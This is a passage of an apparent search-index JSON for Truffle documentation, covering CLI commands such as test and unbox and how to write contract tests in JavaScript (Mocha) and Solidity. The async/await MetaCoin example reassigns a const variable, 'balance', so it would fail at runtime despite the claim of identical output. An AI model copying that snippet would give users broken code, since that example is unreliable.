]] [ --network <name> ] [ --verbose-rpc ] [ --show-events ] [ --debug ] [ --debug-global <identifier> ] [ --bail ] [ --stacktrace [ -extra ]] Runs some or all tests within the test/ directory as specified. See the section on Testing your contracts for more information. Options: <test_file> : Name of the test file to be run. Can include path information if the file does not exist in the current directory. --compile-all : Compile all contracts instead of intelligently choosing which contracts need to be compiled. --compile-all-debug : Like --compile-all , but compiles contracts in debug mode for extra information. Has no effect on Solidity <0.6.3. --network <name> : Specify the network to use, using artifacts specific to that network. Network name must exist in the configuration. --verbose-rpc : Log communication between Truffle and the Ethereum client. --show-events : Log all contract events. --debug : Provides global debug() function for in-test debugging. Usable with Javascript tests only; implies --compile-all . --debug-global <identifier> : Allows one to rename the debug() function to something else. --bail : Bail after the first test failure. May be abbreviated -b . --stacktrace : Allows for mixed Javascript-and-Solidity stacktraces when a Truffle Contract transaction or deployment reverts. Does not apply to calls or gas estimates. Implies --compile-all . May be abbreviated -t . Warning: This option is still somewhat experimental. --stacktrace-extra : Shortcut for --stacktrace --compile-all-debug .","title":"test"},{"location":"docs/truffle/reference/truffle-commands.html#unbox","text":"Download a Truffle Box, a pre-built Truffle project. truffle unbox <box_name> [ <destination_path> ] [ --force ] Downloads a Truffle Box to destination_path if provided. Truffle defaults to the current working directory if this argument is not provided. See the list of available Truffle boxes . You can also design and create your own boxes! See the section on Truffle boxes for more information. Options: <box_name> : Name of the Truffle Box. (required) --force : Unbox project in the current directory regardless of its state. Be careful, this will potentially overwrite files that exist in the directory. Note : box_name can be one of several formats: 1. \\<truffleBoxName> - like metacoin (see the official Truffle boxes here ) 2. \\<gitOrgName/repoName> - like truffle-box/bare-box (your repo will have to have the proper structure - see our page on creating a Truffle Box ) 3. \\<urlToGitRepo> - like https://github.com/truffle-box/bare-box 4. \\<sshUrlToGitRepo> - like git@github.com:truffle-box/bare-box Also note that you can add a # followed by a branch name to the end of all of the above formats to unbox from a specific branch - for example, you could use truffle-box/bare-box#myBranch","title":"unbox"},{"location":"docs/truffle/reference/truffle-commands.html#version","text":"Show version number and exit. truffle version","title":"version"},{"location":"docs/truffle/reference/truffle-commands.html#watch","text":"Watch filesystem for changes and rebuild the project automatically. truffle watch This command will initiate a watch for changes to contracts, application, and configuration files. When there's a change, it will rebuild the app as necessary. Alert : This command is deprecated. Please use external tools to watch for filesystem changes and rerun tests.","title":"watch"},{"location":"docs/truffle/testing/testing-your-contracts.html","text":"Testing Your Contracts \u00b6 Framework \u00b6 Truffle comes standard with an automated testing framework to make testing your contracts a breeze. This framework lets you write simple and manageable tests in two different ways: In Javascript and TypeScript , for exercising your contracts from the outside world, just like your application. In Solidity , for exercising your contracts in advanced, bare-to-the-metal scenarios. Both styles of tests have their advantages and drawbacks. See the next two sections for a discussion of each one. Location \u00b6 All test files should be located in the ./test directory. Truffle will only run test files with the following file extensions: .js , .ts , .es , .es6 , and .jsx , and .sol . All other files are ignored. Command \u00b6 To run all tests, simply run: $ truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., $ truffle test ./path/to/test/file.js Clean-room environment \u00b6 Truffle provides a clean room environment when running your test files. When running your tests against Ganache or Truffle Develop, Truffle will use advanced snapshotting features to ensure your test files don't share state with each other. When running against other Ethereum clients like go-ethereum , Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against. Speed and reliability considerations \u00b6 Both Ganache and Truffle Develop are significantly faster than other clients when running automated tests. Moreover, they contain special features which Truffle takes advantage of to speed up test runtime by almost 90%. As a general workflow, we recommend you use Ganache or Truffle Develop during normal development and testing, and then run your tests once against go-ethereum or another official Ethereum client when you're gearing up to deploy to live or production networks. Stack Traces \u00b6 You can obtain Solidity stack traces for failed transactions with truffle test --stacktrace . This will produce stack traces for transactions and deployments made via Truffle Contract during your tests should one of them revert and thereby causes your test to fail. This option is still experimental, and stack traces are not currently supported for calls or gas estimates. Moreover, while it is turned on, PromiEvent functionality of Truffle Contract (as opposed to Promise functionality) may not work. There is also the option truffle test --stacktrace-extra . This will turn on stack traces and will additionally compile contracts in Solidity's debug mode for additional revert messages. This debug mode was only introduced in Solidity 0.6.3 so it will have no effect on earlier versions of Solidity. Using debug mode may cause problems on larger contracts.","title":"Testing Your Contracts"},{"location":"docs/truffle/testing/testing-your-contracts.html#testing-your-contracts","text":"","title":"Testing Your Contracts"},{"location":"docs/truffle/testing/testing-your-contracts.html#framework","text":"Truffle comes standard with an automated testing framework to make testing your contracts a breeze. This framework lets you write simple and manageable tests in two different ways: In Javascript and TypeScript , for exercising your contracts from the outside world, just like your application. In Solidity , for exercising your contracts in advanced, bare-to-the-metal scenarios. Both styles of tests have their advantages and drawbacks. See the next two sections for a discussion of each one.","title":"Framework"},{"location":"docs/truffle/testing/testing-your-contracts.html#location","text":"All test files should be located in the ./test directory. Truffle will only run test files with the following file extensions: .js , .ts , .es , .es6 , and .jsx , and .sol . All other files are ignored.","title":"Location"},{"location":"docs/truffle/testing/testing-your-contracts.html#command","text":"To run all tests, simply run: $ truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., $ truffle test ./path/to/test/file.js","title":"Command"},{"location":"docs/truffle/testing/testing-your-contracts.html#clean-room-environment","text":"Truffle provides a clean room environment when running your test files. When running your tests against Ganache or Truffle Develop, Truffle will use advanced snapshotting features to ensure your test files don't share state with each other. When running against other Ethereum clients like go-ethereum , Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against.","title":"Clean-room environment"},{"location":"docs/truffle/testing/testing-your-contracts.html#speed-and-reliability-considerations","text":"Both Ganache and Truffle Develop are significantly faster than other clients when running automated tests. Moreover, they contain special features which Truffle takes advantage of to speed up test runtime by almost 90%. As a general workflow, we recommend you use Ganache or Truffle Develop during normal development and testing, and then run your tests once against go-ethereum or another official Ethereum client when you're gearing up to deploy to live or production networks.","title":"Speed and reliability considerations"},{"location":"docs/truffle/testing/testing-your-contracts.html#stack-traces","text":"You can obtain Solidity stack traces for failed transactions with truffle test --stacktrace . This will produce stack traces for transactions and deployments made via Truffle Contract during your tests should one of them revert and thereby causes your test to fail. This option is still experimental, and stack traces are not currently supported for calls or gas estimates. Moreover, while it is turned on, PromiEvent functionality of Truffle Contract (as opposed to Promise functionality) may not work. There is also the option truffle test --stacktrace-extra . This will turn on stack traces and will additionally compile contracts in Solidity's debug mode for additional revert messages. This debug mode was only introduced in Solidity 0.6.3 so it will have no effect on earlier versions of Solidity. Using debug mode may cause problems on larger contracts.","title":"Stack Traces"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html","text":"Writing Tests in JavaScript \u00b6 Truffle uses the Mocha testing framework and Chai for assertions to provide you with a solid framework from which to write your JavaScript tests. Let's dive in and see how Truffle builds on top of Mocha to make testing your contracts a breeze. Note: If you're unfamiliar with writing unit tests in Mocha, please see Mocha's documentation before continuing. Use contract() instead of describe() \u00b6 Structurally, your tests should remain largely unchanged from that of Mocha: Your tests should exist in the ./test directory, they should end with a .js extension, and they should contain code that Mocha will recognize as an automated test. What makes Truffle tests different from that of Mocha is the contract() function: This function works exactly like describe() except it enables Truffle's clean-room features . It works like this: Before each contract() function is run, your contracts are redeployed to the running Ethereum client so the tests within it run with a clean contract state. The contract() function provides a list of accounts made available by your Ethereum client which you can use to write tests. Since Truffle uses Mocha under the hood, you can still use describe() to run normal Mocha tests whenever Truffle clean-room features are unnecessary. Use contract abstractions within your tests \u00b6 Contract abstractions are the basis for making contract interaction possible from JavaScript (they're basically our flux capacitor ). Because Truffle has no way of detecting which contracts you'll need to interact with within your tests, you'll need to ask for those contracts explicitly. You do this by using the artifacts.require() method, a method provided by Truffle that allows you to request a usable contract abstraction for a specific Solidity contract. As you'll see in the example below, you can then use this abstraction to make sure your contracts are working properly. For more information on using contract abstractions, see the Interacting With Your Contracts section. Using artifacts.require() \u00b6 Using artifacts.require() within your tests works the same way as using it within your migrations; you just need to pass the name of the contract. See the artifacts.require() documentation in the Migrations section for detailed usage. Using web3 \u00b6 A web3 instance is available in each test file, configured to the correct provider. So calling web3.eth.getBalance just works! Examples \u00b6 Using .then \u00b6 Here's an example test provided in the MetaCoin Truffle Box . Note the use of the contract() function, the accounts array for specifying available Ethereum accounts, and our use of artifacts.require() for interacting directly with our contracts. File: ./test/metacoin.js const MetaCoin = artifacts . require ( \"MetaCoin\" ); contract ( \"MetaCoin\" , accounts => { it ( \"should put 10000 MetaCoin in the first account\" , () => MetaCoin . deployed () . then ( instance => instance . getBalance . call ( accounts [ 0 ])) . then ( balance => { assert . equal ( balance . valueOf (), 10000 , \"10000 wasn't in the first account\" ); })); it ( \"should call a function that depends on a linked library\" , () => { let meta ; let metaCoinBalance ; let metaCoinEthBalance ; return MetaCoin . deployed () . then ( instance => { meta = instance ; return meta . getBalance . call ( accounts [ 0 ]); }) . then ( outCoinBalance => { metaCoinBalance = outCoinBalance . toNumber (); return meta . getBalanceInEth . call ( accounts [ 0 ]); }) . then ( outCoinBalanceEth => { metaCoinEthBalance = outCoinBalanceEth . toNumber (); }) . then (() => { assert . equal ( metaCoinEthBalance , 2 * metaCoinBalance , \"Library function returned unexpected function, linkage may be broken\" ); }); }); it ( \"should send coin correctly\" , () => { let meta ; // Get initial balances of first and second account. const account_one = accounts [ 0 ]; const account_two = accounts [ 1 ]; let account_one_starting_balance ; let account_two_starting_balance ; let account_one_ending_balance ; let account_two_ending_balance ; const amount = 10 ; return MetaCoin . deployed () . then ( instance => { meta = instance ; return meta . getBalance . call ( account_one ); }) . then ( balance => { account_one_starting_balance = balance . toNumber (); return meta . getBalance . call ( account_two ); }) . then ( balance => { account_two_starting_balance = balance . toNumber (); return meta . sendCoin ( account_two , amount , { from : account_one }); }) . then (() => meta . getBalance . call ( account_one )) . then ( balance => { account_one_ending_balance = balance . toNumber (); return meta . getBalance . call ( account_two ); }) . then ( balance => { account_two_ending_balance = balance . toNumber (); assert . equal ( account_one_ending_balance , account_one_starting_balance - amount , \"Amount wasn't correctly taken from the sender\" ); assert . equal ( account_two_ending_balance , account_two_starting_balance + amount , \"Amount wasn't correctly sent to the receiver\" ); }); }); }); This test will produce the following output: Contract: MetaCoin \u221a should put 10000 MetaCoin in the first account (83ms) \u221a should call a function that depends on a linked library (43ms) \u221a should send coin correctly (122ms) 3 passing (293ms) Using async/await \u00b6 Here is a similar example, but using async/await notation: const MetaCoin = artifacts . require ( \"MetaCoin\" ); contract ( \"2nd MetaCoin test\" , async accounts => { it ( \"should put 10000 MetaCoin in the first account\" , async () => { const instance = await MetaCoin . deployed (); const balance = await instance . getBalance . call ( accounts [ 0 ]); assert . equal ( balance . valueOf (), 10000 ); }); it ( \"should call a function that depends on a linked library\" , async () => { const meta = await MetaCoin . deployed (); const outCoinBalance = await meta . getBalance . call ( accounts [ 0 ]); const metaCoinBalance = outCoinBalance . toNumber (); const outCoinBalanceEth = await meta . getBalanceInEth . call ( accounts [ 0 ]); const metaCoinEthBalance = outCoinBalanceEth . toNumber (); assert . equal ( metaCoinEthBalance , 2 * metaCoinBalance ); }); it ( \"should send coin correctly\" , async () => { // Get initial balances of first and second account. const account_one = accounts [ 0 ]; const account_two = accounts [ 1 ]; const amount = 10 ; const instance = await MetaCoin . deployed (); const meta = instance ; const balance = await meta . getBalance . call ( account_one ); const account_one_starting_balance = balance . toNumber (); balance = await meta . getBalance . call ( account_two ); const account_two_starting_balance = balance . toNumber (); await meta . sendCoin ( account_two , amount , { from : account_one }); balance = await meta . getBalance . call ( account_one ); const account_one_ending_balance = balance . toNumber (); balance = await meta . getBalance . call ( account_two ); const account_two_ending_balance = balance . toNumber (); assert . equal ( account_one_ending_balance , account_one_starting_balance - amount , \"Amount wasn't correctly taken from the sender\" ); assert . equal ( account_two_ending_balance , account_two_starting_balance + amount , \"Amount wasn't correctly sent to the receiver\" ); }); }); This test will produce identical output to the previous example. Specifying tests \u00b6 You can limit the tests being executed to a specific file as follows: truffle test ./test/metacoin.js See the full command reference for more information. Advanced \u00b6 Truffle gives you access to Mocha's configuration so you can change how Mocha behaves. See the project configuration section for more details. TypeScript File Support \u00b6 Truffle supports tests saved as a .ts TypeScript file. Please see the Writing Tests in JavaScript guide for more information.","title":"Writing Tests in JavaScript"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#writing-tests-in-javascript","text":"Truffle uses the Mocha testing framework and Chai for assertions to provide you with a solid framework from which to write your JavaScript tests. Let's dive in and see how Truffle builds on top of Mocha to make testing your contracts a breeze. Note: If you're unfamiliar with writing unit tests in Mocha, please see Mocha's documentation before continuing.","title":"Writing Tests in JavaScript"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#use-contract-instead-of-describe","text":"Structurally, your tests should remain largely unchanged from that of Mocha: Your tests should exist in the ./test directory, they should end with a .js extension, and they should contain code that Mocha will recognize as an automated test. What makes Truffle tests different from that of Mocha is the contract() function: This function works exactly like describe() except it enables Truffle's clean-room features . It works like this: Before each contract() function is run, your contracts are redeployed to the running Ethereum client so the tests within it run with a clean contract state. The contract() function provides a list of accounts made available by your Ethereum client which you can use to write tests. Since Truffle uses Mocha under the hood, you can still use describe() to run normal Mocha tests whenever Truffle clean-room features are unnecessary.","title":"Use contract() instead of describe()"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#use-contract-abstractions-within-your-tests","text":"Contract abstractions are the basis for making contract interaction possible from JavaScript (they're basically our flux capacitor ). Because Truffle has no way of detecting which contracts you'll need to interact with within your tests, you'll need to ask for those contracts explicitly. You do this by using the artifacts.require() method, a method provided by Truffle that allows you to request a usable contract abstraction for a specific Solidity contract. As you'll see in the example below, you can then use this abstraction to make sure your contracts are working properly. For more information on using contract abstractions, see the Interacting With Your Contracts section.","title":"Use contract abstractions within your tests"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#using-artifactsrequire","text":"Using artifacts.require() within your tests works the same way as using it within your migrations; you just need to pass the name of the contract. See the artifacts.require() documentation in the Migrations section for detailed usage.","title":"Using artifacts.require()"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#using-web3","text":"A web3 instance is available in each test file, configured to the correct provider. So calling web3.eth.getBalance just works!","title":"Using web3"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#examples","text":"","title":"Examples"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#using-then","text":"Here's an example test provided in the MetaCoin Truffle Box . Note the use of the contract() function, the accounts array for specifying available Ethereum accounts, and our use of artifacts.require() for interacting directly with our contracts. File: ./test/metacoin.js const MetaCoin = artifacts . require ( \"MetaCoin\" ); contract ( \"MetaCoin\" , accounts => { it ( \"should put 10000 MetaCoin in the first account\" , () => MetaCoin . deployed () . then ( instance => instance . getBalance . call ( accounts [ 0 ])) . then ( balance => { assert . equal ( balance . valueOf (), 10000 , \"10000 wasn't in the first account\" ); })); it ( \"should call a function that depends on a linked library\" , () => { let meta ; let metaCoinBalance ; let metaCoinEthBalance ; return MetaCoin . deployed () . then ( instance => { meta = instance ; return meta . getBalance . call ( accounts [ 0 ]); }) . then ( outCoinBalance => { metaCoinBalance = outCoinBalance . toNumber (); return meta . getBalanceInEth . call ( accounts [ 0 ]); }) . then ( outCoinBalanceEth => { metaCoinEthBalance = outCoinBalanceEth . toNumber (); }) . then (() => { assert . equal ( metaCoinEthBalance , 2 * metaCoinBalance , \"Library function returned unexpected function, linkage may be broken\" ); }); }); it ( \"should send coin correctly\" , () => { let meta ; // Get initial balances of first and second account. const account_one = accounts [ 0 ]; const account_two = accounts [ 1 ]; let account_one_starting_balance ; let account_two_starting_balance ; let account_one_ending_balance ; let account_two_ending_balance ; const amount = 10 ; return MetaCoin . deployed () . then ( instance => { meta = instance ; return meta . getBalance . call ( account_one ); }) . then ( balance => { account_one_starting_balance = balance . toNumber (); return meta . getBalance . call ( account_two ); }) . then ( balance => { account_two_starting_balance = balance . toNumber (); return meta . sendCoin ( account_two , amount , { from : account_one }); }) . then (() => meta . getBalance . call ( account_one )) . then ( balance => { account_one_ending_balance = balance . toNumber (); return meta . getBalance . call ( account_two ); }) . then ( balance => { account_two_ending_balance = balance . toNumber (); assert . equal ( account_one_ending_balance , account_one_starting_balance - amount , \"Amount wasn't correctly taken from the sender\" ); assert . equal ( account_two_ending_balance , account_two_starting_balance + amount , \"Amount wasn't correctly sent to the receiver\" ); }); }); }); This test will produce the following output: Contract: MetaCoin \u221a should put 10000 MetaCoin in the first account (83ms) \u221a should call a function that depends on a linked library (43ms) \u221a should send coin correctly (122ms) 3 passing (293ms)","title":"Using .then"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#using-asyncawait","text":"Here is a similar example, but using async/await notation: const MetaCoin = artifacts . require ( \"MetaCoin\" ); contract ( \"2nd MetaCoin test\" , async accounts => { it ( \"should put 10000 MetaCoin in the first account\" , async () => { const instance = await MetaCoin . deployed (); const balance = await instance . getBalance . call ( accounts [ 0 ]); assert . equal ( balance . valueOf (), 10000 ); }); it ( \"should call a function that depends on a linked library\" , async () => { const meta = await MetaCoin . deployed (); const outCoinBalance = await meta . getBalance . call ( accounts [ 0 ]); const metaCoinBalance = outCoinBalance . toNumber (); const outCoinBalanceEth = await meta . getBalanceInEth . call ( accounts [ 0 ]); const metaCoinEthBalance = outCoinBalanceEth . toNumber (); assert . equal ( metaCoinEthBalance , 2 * metaCoinBalance ); }); it ( \"should send coin correctly\" , async () => { // Get initial balances of first and second account. const account_one = accounts [ 0 ]; const account_two = accounts [ 1 ]; const amount = 10 ; const instance = await MetaCoin . deployed (); const meta = instance ; const balance = await meta . getBalance . call ( account_one ); const account_one_starting_balance = balance . toNumber (); balance = await meta . getBalance . call ( account_two ); const account_two_starting_balance = balance . toNumber (); await meta . sendCoin ( account_two , amount , { from : account_one }); balance = await meta . getBalance . call ( account_one ); const account_one_ending_balance = balance . toNumber (); balance = await meta . getBalance . call ( account_two ); const account_two_ending_balance = balance . toNumber (); assert . equal ( account_one_ending_balance , account_one_starting_balance - amount , \"Amount wasn't correctly taken from the sender\" ); assert . equal ( account_two_ending_balance , account_two_starting_balance + amount , \"Amount wasn't correctly sent to the receiver\" ); }); }); This test will produce identical output to the previous example.","title":"Using async/await"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#specifying-tests","text":"You can limit the tests being executed to a specific file as follows: truffle test ./test/metacoin.js See the full command reference for more information.","title":"Specifying tests"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#advanced","text":"Truffle gives you access to Mocha's configuration so you can change how Mocha behaves. See the project configuration section for more details.","title":"Advanced"},{"location":"docs/truffle/testing/writing-tests-in-javascript.html#typescript-file-support","text":"Truffle supports tests saved as a .ts TypeScript file. Please see the Writing Tests in JavaScript guide for more information.","title":"TypeScript File Support"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html","text":"Writing Tests in Solidity \u00b6 Solidity test contracts live alongside Javascript tests as .sol files. When truffle test is run, they will be included as a separate test suite per test contract. These contracts maintain all the benefits of the Javascript tests: namely a clean-room environment per test suite, direct access to your deployed contracts and the ability to import any contract dependency. In addition to these features, Truffle's Solidity testing framework was built with the following issues in mind: Solidity tests shouldn't extend from any contract (like a Test contract). This makes your tests as minimal as possible and gives you complete control over the contracts you write. Solidity tests shouldn't be beholden to any assertion library. Truffle provides a default assertion library for you, but you can change this library at any time to fit your needs. You should be able to run your Solidity tests against any Ethereum client. Example \u00b6 Let's take a look at an example Solidity test before diving too deeply. Here's the example Solidity test provided for you by truffle unbox metacoin : pragma solidity >= 0.4.25 < 0.6.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MetaCoin.sol\" ; contract TestMetaCoin { function testInitialBalanceUsingDeployedContract () { MetaCoin meta = MetaCoin ( DeployedAddresses . MetaCoin ()); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } function testInitialBalanceWithNewMetaCoin () { MetaCoin meta = new MetaCoin (); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } } This produces the following output: $ truffle test Compiling your contracts... =========================== > Compiling ./contracts/ConvertLib.sol > Compiling ./contracts/MetaCoin.sol > Compiling ./contracts/Migrations.sol > Compiling ./test/TestMetaCoin.sol TestMetaCoin \u2713 testInitialBalanceUsingDeployedContract (79ms) \u2713 testInitialBalanceWithNewMetaCoin (65ms) Contract: MetaCoin \u2713 should put 10000 MetaCoin in the first account (38ms) \u2713 should call a function that depends on a linked library (42ms) \u2713 should send coin correctly (120ms) 5 passing (7s) From the output, you can see reports from two different test files: one JavaScript (Contract: MetaCoin above) and one Solidity (TestMetaCoin above). In this document we will be concerning ourselves exclusively with the Solidity test. Test structure \u00b6 To better understand whats happening, let's discuss things in more detail. Assertions \u00b6 Your assertion functions like Assert.equal() are provided to you by the truffle/Assert.sol library. This is the default assertion library, however you can include your own assertion library so long as the library loosely integrates with Truffle's test runner by triggering the correct assertion events. You can find all available assertion functions in Assert.sol . Deployed addresses \u00b6 The addresses of your deployed contracts (i.e., contracts that were deployed as part of your migrations) are available through the truffle/DeployedAddresses.sol library. This is provided by Truffle and is recompiled and relinked before each suite is run to provide your tests with Truffle's a clean room environment. This library provides functions for all of your deployed contracts, in the form of: DeployedAddresses . < contract name > (); This will return an address that you can then use to access that contract. See the example test above for usage. In order to use the deployed contract, you'll have to import the contract code into your test suite. Notice import \"../contracts/MetaCoin.sol\"; in the example. This import is relative to the test contract, which exists in the ./test directory, and it goes outside of the test directory in order to find the MetaCoin contract. It then uses that contract to cast the address to the MetaCoin type. Test contract names \u00b6 All test contracts must start with Test , using an uppercase T . This distinguishes this contract apart from test helpers and project contracts (i.e., the contracts under test), letting the test runner know which contracts represent test suites. Test function names \u00b6 Like test contract names, all test functions must start with test , lowercase. Each test function is executed as a single transaction, in order of appearance in the test file (like your Javascript tests). Assertion functions provided by truffle/Assert.sol trigger events that the test runner evaluates to determine the result of the test. Assertion functions return a boolean representing the outcome of the assertion which you can use to return from the test early to prevent execution errors (as in, errors that Ganache or Truffle Develop will expose). before / after hooks \u00b6 You are provided many test hooks, shown in the example below. These hooks are beforeAll , beforeEach , afterAll and afterEach , which are the same hooks provided by Mocha in your Javascript tests. You can use these hooks to perform setup and teardown actions before and after each test, or before and after each suite is run. Like test functions, each hook is executed as a single transaction. Note that some complex tests will need to perform a significant amount of setup that might overflow the gas limit of a single transaction; you can get around this limitation by creating many hooks with different suffixes, like in the example below: import \"truffle/Assert.sol\" ; contract TestHooks { uint someValue ; function beforeEach () { someValue = 5 ; } function beforeEachAgain () { someValue += 1 ; } function testSomeValueIsSix () { uint expected = 6 ; Assert . equal ( someValue , expected , \"someValue should have been 6\" ); } } This test contract also shows that your test functions and hook functions all share the same contract state. You can setup contract data before the test, use that data during the test, and reset it afterward in preparation for the next one. Note that just like your Javascript tests, your next test function will continue from the state of the previous test function that ran. Advanced features \u00b6 Solidity tests come with a few advanced features to let you test specific use cases within Solidity. Testing for exceptions \u00b6 You can easily test if your contract should or shouldn't raise an exception (i.e., for require() / assert() / revert() statements; throw on previous versions of Solidity). This topic was first written about by guest writer Simon de la Rouviere in his tutorial Testing for Throws in Truffle Solidity Tests . N.B. that the tutorial makes heavy use of exceptions via the deprecated keyword throw , replaced by revert() , require() , and assert() starting in Solidity v0.4.13. Also, since Solidity v0.4.17, a function type member was added to enable you to access a function selector (e.g.: this.f.selector ), and so, testing for throws with external calls has been made much easier: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; contract TestBytesLib2 { function testThrowFunctions () public { bool r ; // We're basically calling our contract externally with a raw call, forwarding all available gas, with // msg.data equal to the throwing function selector that we want to be sure throws and using only the boolean // value associated with the message call's success ( r , ) = address ( this ). call ( abi . encodePacked ( this . IThrow1 . selector )); Assert . isFalse ( r , \"If this is true, something is broken!\" ); ( r , ) = address ( this ). call ( abi . encodePacked ( this . IThrow2 . selector )); Assert . isFalse ( r , \"What?! 1 is equal to 10?\" ); } function IThrow1 () public pure { revert ( \"I will throw\" ); } function IThrow2 () public pure { require ( 1 == 10 , \"I will throw, too!\" ); } } Testing ether transactions \u00b6 You can also test how your contracts react to receiving Ether, and script that interaction within Solidity. To do so, your Solidity test should have a public function that returns a uint , called initialBalance . This can be written directly as a function or a public variable, as shown below. When your test contract is deployed to the network, Truffle will send that amount of Ether from your test account to your test contract. Your test contract can then use that Ether to script Ether interactions within your contract under test. Note that initialBalance is optional and not required. import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MyContract.sol\" ; contract TestContract { // Truffle will send the TestContract one Ether after deploying the contract. uint public initialBalance = 1 ether ; function testInitialBalanceUsingDeployedContract () { MyContract myContract = MyContract ( DeployedAddresses . MyContract ()); // perform an action which sends value to myContract, then assert. myContract . send (...); } function () { // This will NOT be executed when Ether is sent. \\o/ } } Note that Truffle sends Ether to your test contract in a way that does not execute a fallback function, so you can still use the fallback function within your Solidity tests for advanced test cases.","title":"Writing Tests in Solidity"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#writing-tests-in-solidity","text":"Solidity test contracts live alongside Javascript tests as .sol files. When truffle test is run, they will be included as a separate test suite per test contract. These contracts maintain all the benefits of the Javascript tests: namely a clean-room environment per test suite, direct access to your deployed contracts and the ability to import any contract dependency. In addition to these features, Truffle's Solidity testing framework was built with the following issues in mind: Solidity tests shouldn't extend from any contract (like a Test contract). This makes your tests as minimal as possible and gives you complete control over the contracts you write. Solidity tests shouldn't be beholden to any assertion library. Truffle provides a default assertion library for you, but you can change this library at any time to fit your needs. You should be able to run your Solidity tests against any Ethereum client.","title":"Writing Tests in Solidity"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#example","text":"Let's take a look at an example Solidity test before diving too deeply. Here's the example Solidity test provided for you by truffle unbox metacoin : pragma solidity >= 0.4.25 < 0.6.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MetaCoin.sol\" ; contract TestMetaCoin { function testInitialBalanceUsingDeployedContract () { MetaCoin meta = MetaCoin ( DeployedAddresses . MetaCoin ()); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } function testInitialBalanceWithNewMetaCoin () { MetaCoin meta = new MetaCoin (); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } } This produces the following output: $ truffle test Compiling your contracts... =========================== > Compiling ./contracts/ConvertLib.sol > Compiling ./contracts/MetaCoin.sol > Compiling ./contracts/Migrations.sol > Compiling ./test/TestMetaCoin.sol TestMetaCoin \u2713 testInitialBalanceUsingDeployedContract (79ms) \u2713 testInitialBalanceWithNewMetaCoin (65ms) Contract: MetaCoin \u2713 should put 10000 MetaCoin in the first account (38ms) \u2713 should call a function that depends on a linked library (42ms) \u2713 should send coin correctly (120ms) 5 passing (7s) From the output, you can see reports from two different test files: one JavaScript (Contract: MetaCoin above) and one Solidity (TestMetaCoin above). In this document we will be concerning ourselves exclusively with the Solidity test.","title":"Example"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#test-structure","text":"To better understand whats happening, let's discuss things in more detail.","title":"Test structure"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#assertions","text":"Your assertion functions like Assert.equal() are provided to you by the truffle/Assert.sol library. This is the default assertion library, however you can include your own assertion library so long as the library loosely integrates with Truffle's test runner by triggering the correct assertion events. You can find all available assertion functions in Assert.sol .","title":"Assertions"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#deployed-addresses","text":"The addresses of your deployed contracts (i.e., contracts that were deployed as part of your migrations) are available through the truffle/DeployedAddresses.sol library. This is provided by Truffle and is recompiled and relinked before each suite is run to provide your tests with Truffle's a clean room environment. This library provides functions for all of your deployed contracts, in the form of: DeployedAddresses . < contract name > (); This will return an address that you can then use to access that contract. See the example test above for usage. In order to use the deployed contract, you'll have to import the contract code into your test suite. Notice import \"../contracts/MetaCoin.sol\"; in the example. This import is relative to the test contract, which exists in the ./test directory, and it goes outside of the test directory in order to find the MetaCoin contract. It then uses that contract to cast the address to the MetaCoin type.","title":"Deployed addresses"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#test-contract-names","text":"All test contracts must start with Test , using an uppercase T . This distinguishes this contract apart from test helpers and project contracts (i.e., the contracts under test), letting the test runner know which contracts represent test suites.","title":"Test contract names"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#test-function-names","text":"Like test contract names, all test functions must start with test , lowercase. Each test function is executed as a single transaction, in order of appearance in the test file (like your Javascript tests). Assertion functions provided by truffle/Assert.sol trigger events that the test runner evaluates to determine the result of the test. Assertion functions return a boolean representing the outcome of the assertion which you can use to return from the test early to prevent execution errors (as in, errors that Ganache or Truffle Develop will expose).","title":"Test function names"},{"location":"docs/truffle/testing/writing-tests-in-solidity.html#before-after-hooks","text":"You are provided many test hooks, shown in the example below. These hooks are beforeAll , beforeEach , afterAll and afterEach , which are the same hooks provided by Mocha in your Javascript tests. You can use these hooks to perform setup and teardown actions before and after each test, or before and after each suite is run. Like test functions, each hook is executed as a single transaction. Note that some complex tests will need to perform a significant amount of setup that might overflow the gas limit of a single transaction; you can get around this limitation by creating many hooks with different suffixes, like in the example below: import \"truffle/Assert.sol\" ; contract TestHooks { uint someValue ; function beforeEach () { someValue = 5 ; } function beforeEachAgain () { someValue += 1 ; } function testSomeValueIsSix () { uint expected = 6 ; Assert . equal ( someValue , expected , \"someValue should have been 6\" ); } } This test contract also shows that your test functions and hook functions all share the same contract state. You can setup contract data before the test, use that data during the test, and reset it afterward in preparation for the next one. Note that just like your Javascript tests, your next test function will continue from the state of the previous test function that ran.","title":"before / after 